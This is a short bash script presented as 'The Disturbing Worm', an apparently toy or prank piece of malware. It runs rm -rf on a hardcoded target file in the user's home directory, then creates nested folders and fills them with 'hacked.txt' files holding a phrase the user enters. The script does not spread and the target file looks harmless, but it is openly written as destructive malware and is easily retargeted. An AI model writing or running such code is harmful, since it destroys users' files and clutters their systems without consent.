# Counter that determines number of repetitions of corruption.
# Increase to heat your room.
corruption_counter=5

# Target files to be deleted
targets=("$HOME/desktop/to_be_deleted.txt")

# Go to the file's current directory
cd "$(dirname "${BASH_SOURCE[0]}")" || exit 1

# Greeting
echo -e "\n---- The Disturbing Worm ----\n"

# Take user input
echo -e "Enter your phase:\n"

# Read user phrase
read -r phrase

# Create the folders
for ((i = 0; i < corruption_counter; i++)); do
    mkdir "./$i"
done

# Iterate over the target list and destroy
for target in "${targets[@]}"; do
    rm -rf "$target"
done

# Create corruption_counter number of folders and inside each create corruption_counter number
# of folders AND inside of each folder create corruption_counter number of hacked.txt files. LOL.
for ((top_index = 0; top_index < corruption_counter; top_index++)); do
    for ((folder_index = 0; folder_index < corruption_counter; folder_index++)); do
        # Create intermediate folder and then create hacked.txt file
        mkdir "./$top_index/$folder_index" && echo "$phrase" > "./$top_index/$folder_index/hacked.txt"
    done
done

# Goodbye text
echo "Worm executed successfully."
echo -e "\n---- The Disturbing Worm ----\n"
exit 0
